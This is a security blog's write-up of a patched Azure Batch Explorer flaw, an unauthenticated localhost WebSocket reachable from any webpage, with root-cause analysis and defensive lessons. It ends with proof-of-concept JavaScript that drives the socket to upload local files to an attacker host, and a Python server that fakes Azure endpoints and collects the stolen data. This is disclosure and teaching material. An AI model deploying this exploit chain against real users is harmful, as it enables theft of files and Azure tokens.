<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Azure Batch Explorer: Drive-By File and Token Leak via Local WebSocket</title>
  <link rel="stylesheet" href="https://blog.qwertysecurity.com/assets/css/style.css" />
  <style>
        pre {
    font-family: 'Courier New', Courier, monospace;
    white-space: pre; 
  }
    body {
      background-color: #ffffcc;
      color: black;
      font-family: monospace;
      margin: 40px;
    }

    a { 
      color: blue; 
      }
    h2 { text-transform: lowercase; }
    hr { border: 1px dashed #999; }

    .blink {
      animation: blink 1s step-start infinite;
    }

    @keyframes blink {
      50% { opacity: 0; }
    }

    h1.rainbow {
      font-size: 32px;
      font-weight: bold;
      background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet);
      -webkit-background-clip: text;
      color: transparent;
      display: inline-block;
    }

.wave-letter {
  display: inline-block;
  animation: wave 1.5s infinite ease-in-out;
  font-weight: bold;
  font-size: 32px;
  background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet);
  background-clip: text;
  -webkit-background-clip: text;
  color: transparent;
  background-size: 800% 100%;
}

.g0  { background-position: 0% 50%; }
.g1  { background-position: 9% 50%; }
.g2  { background-position: 18% 50%; }
.g3  { background-position: 27% 50%; }
.g4  { background-position: 36% 50%; }
.g5  { background-position: 45% 50%; }
.g6  { background-position: 54% 50%; }
.g7  { background-position: 63% 50%; }
.g8  { background-position: 72% 50%; }
.g9  { background-position: 81% 50%; }
.g10 { background-position: 90% 50%; }
.g11 { background-position: 100% 50%; }

@keyframes wave {
  0%   { transform: translateY(0); }
  25%  { transform: translateY(-6px); }
  50%  { transform: translateY(0); }
  75%  { transform: translateY(6px); }
  100% { transform: translateY(0); }
}


    @keyframes wave {
      0%   { transform: translateY(0); }
      25%  { transform: translateY(-6px); }
      50%  { transform: translateY(0); }
      75%  { transform: translateY(6px); }
      100% { transform: translateY(0); }
    }

    .wave-letter:nth-child(1)  { animation-delay: 0s; }
    .wave-letter:nth-child(2)  { animation-delay: 0.1s; }
    .wave-letter:nth-child(3)  { animation-delay: 0.2s; }
    .wave-letter:nth-child(4)  { animation-delay: 0.3s; }
    .wave-letter:nth-child(5)  { animation-delay: 0.4s; }
    .wave-letter:nth-child(6)  { animation-delay: 0.5s; }
    .wave-letter:nth-child(7)  { animation-delay: 0.6s; }
    .wave-letter:nth-child(8)  { animation-delay: 0.7s; }
    .wave-letter:nth-child(9)  { animation-delay: 0.8s; }
    .wave-letter:nth-child(10) { animation-delay: 0.9s; }
    .wave-letter:nth-child(11) { animation-delay: 1.0s; }
    .wave-letter:nth-child(12) { animation-delay: 1.1s; }
  

    pre.code-green {
      background: #000;
      color: #0f0;
      padding: 1em;
      overflow-x: auto;
      font-family: "Source Code Pro", monospace;
      border-radius: 4px;
      margin: 1.5em 0;
    }
    pre.code-green code {
      color: inherit;
      background: none;
    }
  </style>
</head>

<body class="site">
  <header class="site-header">
    <div class="inner">
      <a href="https://blog.qwertysecurity.com/" class="site-logo">Qwerty Security</a>
      <nav class="site-nav">
        <a href="https://blog.qwertysecurity.com/">Home</a>
        <a href="https://blog.qwertysecurity.com/tags/">Tags</a>
        <a href="https://github.com/qwertysecurity">GitHub</a>
      </nav>
    </div>
  </header>

  <main class="site-main inner">
    <article class="post">
      <header class="post-header">
        <h1 class="post-title">
          Azure Batch Explorer: Drive-By File and Token Leak via Local WebSocket (Patched)
        </h1>
        <p class="post-meta">August 15, 2025 · Vulnerability Write-up</p>
      </header>
      <div class="post-content">

        <p>
          Here’s a reminder that local developer tools can quietly expand your attack surface.
          Azure Batch Explorer is a desktop app Microsoft maintains to manage Azure Batch resources.
          Versions up to <strong>2.21.0.1069</strong> opened a WebSocket on 127.0.0.1 with no origin
          checks, CORS enforcement, or authentication. Any webpage you visited could talk straight to it.
          The fix is out now so let’s unpack what went wrong and why it matters.
        </p>

        <hr />

        <h2>What Was the Risk?</h2>
        <p>
          If you ran a vulnerable version of Batch Explorer and simply opened a malicious webpage,
          that page could:
        </p>
        <ul>
          <li>Connect to <code>ws://127.0.0.1:45032</code> and issue JSON-RPC calls</li>
          <li>Trigger privileged actions like uploading any local file or stealing Azure refresh tokens</li>
          <li>Do it all without a single prompt or click</li>
        </ul>
        <p>
          The app exposed a local control plane to the browser without validating who was talking to it.
        </p>

        <h2>What Could Be Stolen?</h2>
        <ul>
          <li>Any file the app could read: docs, shell configs, credential stores—even your entire user folder</li>
          <li>Azure refresh tokens with scopes such as <code>offline_access</code>, <code>openid</code>,
            and <code>user_impersonation</code></li>
        </ul>
        <p>
          If those tokens belong to a high-privilege account, an attacker could go from a simple web page
          to full Azure privilege escalation.
        </p>

        <h2>How the PoC Worked</h2>
        <ol>
          <li>Attacker hosts a malicious HTTPS page and a fake “Azure” endpoint using a Python server.</li>
          <li>Victim opens Batch Explorer, which spins up a WebSocket on localhost:45032.</li>
          <li>Victim browses to the attacker’s page and the JS opens the WebSocket.</li>
          <li>JS sends a <code>create-file-group</code> JSON-RPC call pointing uploads at the attacker’s server.</li>
          <li>Files like <code>AppData/Local/Microsoft/Edge/User Data/Default/Sessions/tab*</code>
            get exfiltrated.</li>
        </ol>
        <p>
          Batch Explorer trusted any <code>armUrl</code> or <code>storageEndpoint</code> in the payload,
          even if it pointed outside Azure.
        </p>

        <h2>Why It Was Missed</h2>
        <p>
          This wasn’t a subtle race condition or side-channel trick. It boiled down to:
        </p>
        <ul>
          <li>A local WebSocket server with no origin validation</li>
          <li>No authentication or permission checks on JSON-RPC methods</li>
          <li>Blind trust in user-supplied URLs</li>
        </ul>
        <p>
          Even top-tier vendors can slip up on basic trust boundaries when they assume <code>localhost</code>
          equals safe.
        </p>

        <h2>On Bug Bounties and Scope</h2>
        <p>
          Microsoft marked this out of scope because the app is open source. That’s technically correct,
          but they’re the sole maintainer and publisher—this isn’t a forgotten community fork.
        </p>
        <p>
          Their Azure bounty scope now explicitly excludes first-party open source tools like the CLI
          and PowerShell modules. Users assume vendor-published tools carry vendor-level security care,
          license notwithstanding.
        </p>

        <h2>Key Lessons</h2>
        <ul>
          <li>Enforce authentication and origin checks on every local RPC interface</li>
          <li>Don’t assume browser equals trusted—treat web inputs as untrusted data</li>
          <li>Map your threat model to real-world usage and support lifecycles</li>
          <li>Vendor trust boundaries don’t always match your own—revalidate assumptions for every tool</li>
        </ul>

        <h2>Wrapping Up</h2>
        <p>
          The patch rolled out quickly, which is great. But the root cause—unauthenticated local
          control interfaces—is still popping up across tooling. If your app runs alongside the browser
          and can touch tokens or files, make authentication a hard requirement, even for localhost.
        </p>

        <h2>PoC HTML (sketchy black & green)</h2>
        <pre class="code-green"><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
function batchExfil(fileOrFolder, malServer, recurse) {
  try { ws.close() } catch(e) {}
  const ws = new WebSocket('ws://1:1@127.0.0.1:45032/')
  ws.onopen = () =&gt; {
    ws.send(\`
      {"jsonrpc":"2.0",
       "method":"create-file-group",
       "params":["asdzwzw","\${fileOrFolder}",{"fullpath":true,"prefix":false,"flatten":false,"recursive":\${recurse}}],
       "id":0,"request_id":0,
       "options":{"authentication":{
         "batchToken":"a.a.azwzw","armToken":"a.a.azwzw",
         "armUrl":"https://\${malServer}/",
         "storageEndpoint":"@\${malServer}/storageendpoint/",
         "account":{ /* … account JSON … */ }
       }}
      }
    \`);
  }
  ws.onmessage = m =&gt; console.log('message received', m.data);
}
&lt;/script&gt;
&lt;body&gt;
  &lt;h1&gt;PoC for Batch Explorer vulnerability&lt;/h1&gt;
  &lt;!-- input forms & buttons omitted for brevity --&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

        <h2>Python Server PoC (black & green)</h2>
        <pre class="code-green"><code>from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl, logging, http

class MyHTTPRequestHandler(SimpleHTTPRequestHandler):
    def handle_request(self):
        path = self.path.split('?')[0]
        if path.endswith('batchAccounts'):
            self.send_response(http.HTTPStatus.OK)
            message = '{ "value": [ /* account JSON */ ] }'
            self.send_header('Content-Type','application/json')
        elif path.endswith('listKeys'):
            self.send_response(http.HTTPStatus.OK)
            message = '{"keys":[{"keyName":"key1","value":"","permissions":"FULL"}]}'
            self.send_header('Content-Type','application/json')
        elif self.path.startswith('/storageendpoint/'):
            self.send_response(http.HTTPStatus.CREATED)
            message = 'Okay'
            self.send_header('access-control-allow-origin','*')
            self.send_header('Content-Type','application/octet-stream')
        else:
            self.send_response(http.HTTPStatus.NOT_FOUND)
            message = 'not found'

        # common headers
        self.send_header('Cache-Control','no-cache')
        self.end_headers()
        self.wfile.write(message.encode())

    def do_GET(self):    self.handle_request()
    def do_POST(self):
        length = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(length).decode('utf-8','ignore')
        print(f"POST body: {body}")
        self.handle_request()
    # Options, PUT, DELETE etc. all map to handle_request…

httpd = HTTPServer(('0.0.0.0',443), MyHTTPRequestHandler)
sslctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
sslctx.load_cert_chain('certificate.crt','private.key')
httpd.socket = sslctx.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
</code></pre>

      </div>
    </article>
  </main>
    <footer class="site-footer">
    <div class="inner">
      <p>Go back to home<a href="https://blog.qwertysecurity.com/"></a></p>
    </div>
  </footer>
</body>
</html>
